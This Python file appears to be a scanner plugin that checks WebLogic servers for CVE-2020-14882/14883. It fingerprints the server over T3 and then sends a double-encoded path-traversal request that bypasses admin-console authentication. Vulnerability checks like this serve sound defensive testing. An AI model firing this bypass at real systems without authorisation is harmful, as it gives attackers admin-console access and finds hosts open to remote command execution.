import requests
import urllib, re
import socket, time
from urllib.parse import urlparse

def weblogic_fingerprint(url):          # weblogic版本指纹
    oH = urlparse(url)
    a = oH.netloc.split(':')
    port = 80
    if 2 == len(a):
        port = a[1]
    elif 'https' in oH.scheme:
        port = 443
    host = a[0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    server_address = (str(host), int(port))
    sock.connect(server_address)
    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
    time.sleep(1)
    try:
        version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
        if version:
            return True
        else:
            return False
    except:
        return False

def verify(url):
    relsult = {
        'name': 'Weblogic未授权远程命令执行漏洞(CVE-2020-14882&CVE-2020-14883)',
        'vulnerable': False
    }
    path = "/console/css/%252e%252e%252fconsole.portal"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        if weblogic_fingerprint(url) is not True:
            return relsult
        vulurl = urllib.parse.urljoin(url, path)
        session = requests.session()
        req1 = session.get(vulurl, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if req1.status_code == 302 and "ADMINCONSOLESESSION" in req1.headers["Set-Cookie"]:
            req2 = session.get(vulurl, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if req2.status_code == 200:
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['vurl'] = vulurl
                relsult['about'] = 'http://www.javashuo.com/article/p-glmljccr-oa.html, https://www.cnblogs.com/liliyuanshangcao/p/13962160.html'
        return relsult
    except:
        return relsult








